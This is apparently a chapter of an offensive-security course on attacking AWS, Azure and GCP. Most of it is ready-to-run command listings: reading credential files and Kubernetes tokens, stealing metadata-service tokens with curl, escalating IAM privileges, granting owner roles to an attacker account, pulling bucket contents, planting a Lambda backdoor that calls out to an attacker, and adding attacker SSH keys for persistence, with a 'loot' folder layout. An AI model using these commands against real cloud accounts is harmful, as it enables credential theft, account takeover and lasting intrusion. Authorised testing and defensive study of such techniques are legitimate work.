11 - Cloud Security
Philosophy
Cloud environments introduce new paradigms: ephemeral resources, APIs instead of servers, and identity as the new perimeter. This phase focuses on attacking cloud infrastructure—AWS, Azure, GCP—by exploiting misconfigurations, leaked credentials, and overprivileged roles. The goal is to move from a low-privileged user to full cloud compromise.

Attack Surface Overview
Cloud credentials: Access keys, service principals, tokens

IAM roles/permissions: Overly permissive policies

Storage buckets: Publicly readable/writable S3, Azure Blob

Compute instances: EC2, VMs with metadata service

Serverless functions: Lambda, Azure Functions

Kubernetes: Misconfigured clusters, RBAC

APIs: Management endpoints, metadata service

Third-party integrations: OAuth, SaaS apps

Cloud Security Workflow
text
┌─────────────────────────────────────────────────────────┐
│              Credential Discovery                         │
│  (Env vars, config files, metadata service)              │
└──────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│              Cloud Provider Enumeration                   │
│  (Identity, permissions, resources)                       │
└──────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│              Privilege Escalation                         │
│  (IAM misconfigurations, role assumptions)                │
└──────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│              Resource Exploitation                        │
│  (Storage bucket access, instance takeover)              │
└──────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│              Persistence                                  │
│  (Backdoor users, API keys, Lambda backdoors)            │
└──────────────────────────────────────────────────────────┘
Command Arsenal
AWS Enumeration
bash
# Check current identity
aws sts get-caller-identity
aws iam get-user

# List resources
aws s3 ls
aws ec2 describe-instances --region us-east-1
aws lambda list-functions --region us-east-1
aws iam list-users
aws iam list-roles
aws iam list-policies

# Check bucket permissions
aws s3api get-bucket-acl --bucket target-bucket
aws s3api get-bucket-policy --bucket target-bucket

# Download bucket contents
aws s3 sync s3://target-bucket ./downloaded/

# Enumerate EC2 metadata (from inside instance)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
Azure Enumeration
bash
# Login
az login
az account show
az account list

# List resources
az vm list --output table
az storage account list
az role assignment list --assignee user@domain.com
az keyvault list

# Check storage
az storage container list --account-name targetaccount
az storage blob list --container-name secrets --account-name targetaccount
az storage blob download --container-name secrets --name secret.txt --file secret.txt

# Azure AD enumeration
az ad user list
az ad group list
az ad sp list
GCP Enumeration
bash
# Auth
gcloud auth login
gcloud config list
gcloud projects list

# List resources
gcloud compute instances list
gcloud storage ls
gcloud iam service-accounts list
gcloud iam roles list

# GCS buckets
gsutil ls
gsutil ls gs://target-bucket
gsutil cp gs://target-bucket/secret.txt .
Cloud Credential Discovery
bash
# Environment variables
env | grep -i aws
env | grep -i azure
env | grep -i google

# Config files
cat ~/.aws/credentials
cat ~/.aws/config
cat ~/.azure/azureProfile.json
cat ~/.azure/accessTokens.json
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/access_tokens.db

# From EC2 metadata (if on instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# From Docker containers
cat /root/.aws/credentials
Privilege Escalation Techniques
AWS

bash
# Assume role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name attacker
# Use credentials from output

# If user has iam:CreatePolicyVersion, create admin policy
aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --policy-document file://admin.json --set-as-default

# If user can pass role to EC2, start instance with admin role
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro --iam-instance-profile Name=AdminRole
# Then access metadata from that instance
Azure

bash
# If Contributor on VM, run command with managed identity
az vm run-command invoke --resource-group RG --name VMName --command-id RunPowerShellScript --scripts "curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com -H Metadata:true"
GCP

bash
# If you can update IAM policy
gcloud projects add-iam-policy-binding project-id --member=user:attacker@example.com --role=roles/owner
Storage Exploitation
bash
# AWS S3 public buckets
aws s3 ls s3://company-backups --no-sign-request
# Upload malicious file if writeable
echo "malicious" > test.txt
aws s3 cp test.txt s3://company-backups/ --no-sign-request

# Azure Blob public containers
az storage blob list --container-name public --account-name targetaccount --auth-mode anonymous
Serverless Backdoors
bash
# AWS Lambda backdoor
aws lambda update-function-code --function-name my-function --zip-file fileb://backdoor.zip
# backdoor.zip contains function that calls out to attacker
Deep Cloud Attacks
Metadata Service Attacks
AWS

bash
# From compromised EC2
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Use those credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
Azure

bash
# Managed identity token
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true
# Use token to access Azure management API
GCP

bash
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
Kubernetes Enumeration
bash
# If inside a pod
kubectl get pods
kubectl get secrets
kubectl get configmaps
# Check permissions
kubectl auth can-i create pod
kubectl auth can-i list secrets --all-namespaces

# Mounted service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use that token to authenticate to API server
Cloud Shell Persistence
bash
# Add SSH keys to project metadata
gcloud compute project-info add-metadata --metadata ssh-keys="attacker:ssh-rsa AAA..."
Automation Techniques
Cloud Enumeration Script
bash
#!/bin/bash
# cloud_enum.sh - Automate cloud provider checks

# AWS
if command -v aws &> /dev/null; then
    echo "[*] AWS credentials found"
    aws sts get-caller-identity > aws_identity.txt
    aws iam list-users > aws_users.txt
    aws s3 ls > aws_buckets.txt
fi

# Azure
if command -v az &> /dev/null; then
    echo "[*] Azure credentials found"
    az account show > azure_account.txt
    az vm list --output table > azure_vms.txt
    az storage account list > azure_storage.txt
fi

# GCP
if command -v gcloud &> /dev/null; then
    echo "[*] GCP credentials found"
    gcloud projects list > gcp_projects.txt
    gcloud compute instances list > gcp_instances.txt
fi
Cloud Scanner with ScoutSuite
bash
# ScoutSuite (multi-cloud auditing)
pip install scoutsuite
scout aws --access-keys --access-key-id AKIA... --secret-access-key ...
scout azure --cli
scout gcp --user-account
Attack Path Identification
Common Cloud Attack Chains
Leaked AWS keys → S3 bucket read → Credentials in bucket → IAM privilege escalation

Compromised EC2 instance → Metadata service → Role credentials → Other resources

Public S3 bucket → Sensitive data → Access keys → Full compromise

Kubernetes pod with service account → API access → Create privileged pod → Host compromise

Common Mistakes
Mistake 1: Ignoring cloud metadata service
It's a goldmine.

Mistake 2: Assuming default credentials are safe
Many cloud resources are publicly exposed.

Mistake 3: Not checking IAM permissions thoroughly
Overprivileged roles are everywhere.

Mistake 4: Using outdated tools
Cloud APIs change; use updated tools.

Professional Tips
Tip 1: Use nimbostratus for AWS privilege escalation
It automates many attack paths.

Tip 2: Always check for public buckets
Use tools like bucket-stream or slurp.

Tip 3: In Azure, check for Azure Automation accounts
They often have runbooks with credentials.

Tip 4: In GCP, check for Cloud Functions
They may have environment variables with secrets.

Output Organization
text
11-Cloud-Security/
├── README.md
├── providers/
│   ├── aws/
│   │   ├── credentials.txt
│   │   ├── iam_policies.txt
│   │   ├── s3_buckets.txt
│   │   └── ec2_instances.txt
│   ├── azure/
│   │   ├── subscriptions.txt
│   │   ├── role_assignments.txt
│   │   ├── storage_accounts.txt
│   │   └── vms.txt
│   └── gcp/
│       ├── projects.txt
│       ├── service_accounts.txt
│       ├── buckets.txt
│       └── instances.txt
├── loot/
│   ├── bucket_contents/
│   └── credentials_dump.txt
└── attack_paths.txt
